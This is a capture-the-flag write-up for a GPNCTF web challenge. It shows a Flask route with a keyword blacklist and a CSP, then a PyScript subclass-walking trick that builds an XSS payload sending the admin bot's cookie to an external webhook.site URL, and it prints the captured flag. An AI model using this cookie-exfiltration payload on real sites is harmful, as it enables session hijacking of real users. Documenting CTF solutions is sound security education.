The source code for this challenge was provided. There was no apparent XSS
vector on the server-side. But there were a couple of related defenses on
app.py:  
```  
[...]  
@app.after_request  
def add_csp(res):  
   res.headers['Content-Security-Policy'] = "script-src 'self' 'wasm-unsafe-
eval'; object-src 'none'; base-uri 'none';"  
   return res  
[...]  
@app.route('/<code_id>/exec')  
def code_page(code_id):  
   if code_id not in projects.keys():  
       abort(404)

   code = projects.get(code_id)

   # Genius filter to prevent xss  
   blacklist = ["script", "img", "onerror", "alert"]  
   for word in blacklist:  
       if word in code:  
           # XSS attempt detected!  
           abort(403)

   res = make_response(render_template("code.html", code=code))  
   return res  
```  
PyScript was being used on the front-end to run python code on the browser
that we could provide. I didn't found a way to import modules so I checked the
available methods with the following payload:  
```  
print(dict.__base__.__subclasses__())  
```  
Which resulted in 367 class methods being printed. Out of those one in
particular can be used in our XSS efforts:  
```  
number 363 <class 'pyscript.Element'>  
```  
Uppon checing the documentation at
https://docs.pyscript.net/latest/reference/API/element.html?highlight=element
and https://docs.pyscript.net/latest/tutorials/writing-to-page.html I forged
the final payload to get the admin's cookie:  
```  
but = dict.__base__.__subclasses__()[363]("buttons")  
but.element.innerHTML=
'![](https://webhook.site/f202667e-9179-425d-80c1-fd62da5915d4?'+but.element.ownerDocument.cookie+')'  
```  
Sent the link to this code to the admin's bot and got the flag on the
webhook.site:  
```  
GPNCTF{4pp4r3ntly_pyth0n_1s_n0w_us3d_f0r_3v3ryth1ng_l2lIMU7mVOxawTvXBub}  
```  
Check the video above for a more comprehensive overview of the exercise and
feel free to ask questions in the comments.

Original writeup (https://youtu.be/P_0wrB-EAeU).